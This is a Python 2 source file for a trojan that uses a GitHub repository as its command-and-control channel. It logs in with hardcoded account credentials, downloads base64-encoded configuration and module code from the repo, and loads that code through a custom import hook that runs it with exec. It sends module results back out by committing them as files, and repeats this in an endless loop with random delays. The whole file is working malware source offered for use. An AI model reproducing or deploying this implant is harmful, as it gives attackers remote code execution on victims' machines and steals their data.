import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
from github3 import login

trojan_id="trojan"
trojan_config = "%s.json" %(trojan_id)
data_path = "data/%s/" %(trojan_id)
trojan_modules = []
configured = False
task_queue = Queue.Queue()

def connect_github():
	gh = login(username="advancenetprog",password="advnetprog1")
	repo = gh.repository ("advancenetprog","testing")
	branch = repo.branch("master")
	return gh,repo,branch

def get_file_contens(filepath):
	gh,repo,brach = connect_github()
	tree = brach.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print "found file %s" %filepath
			blob = repo.blob(filename._json_data['sha'])
			print base64.b64decode(blob.content)
			return blob.content
	return None

def get_trojan_config():
	global configured
	config_json = get_file_contens(trojan_config)
	config = json.loads(base64.b64decode(config_json))
	configured = True

	for task in config:
		print task['module']
		if task['module'] not in sys.modules:
			exec("import %s" %task['module'])
		return config

def store_module_result(data):
	gh,repo,branch = connect_github()
	remove_path = "data/%s/%d.data" %(trojan_id,random.randint(1000,100000))
	repo.create_file(remove_path,"Commit massage",base64.b64encode(data))
	return

class GitImporter(object):
	def __init__(self) : 
		self.current_module_code =""

	def find_module(self, fullname,path=None):
		print "find module"
		if configured :
			print "Attempting to retrieve %s" %fullname
			new_library = get_file_contens("modules/%s/" %fullname)

			if new_library is not None:
				self.current_module_code = base64.b64decode(new_library)
				return self
		return None

	def load_module(self,name):
		module = imp.new_module(name)
		exec self.current_module_code in module.__dict__
		sys.modules[name] = module
		return module 

def module_runner(module):
	task_queue.put(1)
	result = sys.modules[module].run()
	task_queue.get()

	store_module_result(result)
	return

sys.meta_path = [GitImporter()]

while True:
	if task_queue.empty():
		config = get_trojan_config()
		for task in config:
			print "in task"
			t = threading.Thread(target=module_runner,args=(task['module'],))
			t.start()
			time.sleep(random.randint(1000,10000))
